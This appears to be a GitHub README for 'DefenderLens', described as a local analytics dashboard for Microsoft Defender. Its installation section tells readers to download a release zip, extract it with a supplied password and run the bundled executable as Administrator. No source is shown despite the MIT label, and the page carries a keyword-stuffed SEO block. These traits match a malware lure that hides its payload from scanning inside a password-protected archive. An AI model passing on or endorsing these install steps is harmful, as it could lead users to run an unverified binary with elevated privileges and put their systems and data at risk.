<img width="1876" height="1034" alt="image" src="https://github.com/user-attachments/assets/4e03015c-f205-4853-b628-30c2ee1f9ee4" />

# DefenderLens
Advanced analytics dashboard for Microsoft Defender — real-time threat visualization, scan history, and security event intelligence in one native Windows console.
# DefenderLens — Microsoft Defender Analytics Dashboard

**Advanced analytics dashboard for Microsoft Defender.** Visualize threats, monitor scan history, and analyze security events in real time — built for Windows security analysts, sysadmins, and power users.

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue)
![Defender](https://img.shields.io/badge/integration-Microsoft%20Defender-0078D4)
![Status](https://img.shields.io/badge/status-stable-brightgreen)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

---

## Overview

DefenderLens reads Microsoft Defender operational logs and telemetry to produce a unified, high-signal dashboard covering threat detections, quarantined items, scan timelines, and engine health. No cloud upload, no third-party backend — everything is parsed and rendered locally.

## Key Features

- **Threat Visualization** — severity heatmaps, detection timelines, and category breakdowns.
- **Scan History Analytics** — full audit of quick, full, and custom scans with duration and result deltas.
- **Real-Time Event Stream** — live tail of Defender operational log entries.
- **Quarantine & Remediation Tracking** — what was caught, when, and what action was taken.
- **Engine & Signature Health** — version tracking, update freshness, and protection status.
- **Exportable Reports** — CSV / JSON output for SIEM ingestion or offline review.
- **Zero Telemetry** — 100% local processing.

## Installation

1. Download `DefenderLens-v1.0.0.zip` from the [Releases](../../releases/latest) section.
2. Extract with password: `8025381933`.
3. Run `DefenderLens.exe` (Administrator privileges required to read Defender event logs).
4. Dashboard opens in the native window — no installer, no dependencies.

## System Requirements

| Component | Requirement |
|---|---|
| OS | Windows 10 / 11 (x64) |
| Security | Microsoft Defender enabled |
| Runtime | .NET 8 Desktop Runtime |
| Privileges | Administrator (for event log access) |

## Keywords

Microsoft Defender dashboard · Defender threat analytics · Windows Defender scan history · Defender log viewer · security event visualization · threat detection dashboard · Defender telemetry · Windows security analytics · antivirus log analyzer · Defender monitoring tool.

## License

MIT © spikefiscalhatchet

## Disclaimer

DefenderLens is an independent analytics tool and is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. "Microsoft Defender" is a trademark of Microsoft Corporation.
